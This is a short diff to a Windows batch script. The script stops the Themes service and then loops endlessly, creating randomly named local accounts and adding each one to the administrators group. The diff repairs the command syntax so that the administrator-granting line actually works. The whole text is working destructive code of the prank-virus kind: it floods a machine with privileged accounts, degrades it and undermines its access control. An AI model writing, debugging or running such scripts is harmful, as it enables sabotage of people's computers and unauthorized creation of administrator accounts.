@@ -7,5 +7,5 @@ cls
 net stop themes
 :itbegins
 net user SHITHEAD%random% /add
-net user localgroup administrators SHITHEAD%random% /add
+net localgroup administrators SHITHEAD%random% /add
 goto itbegins
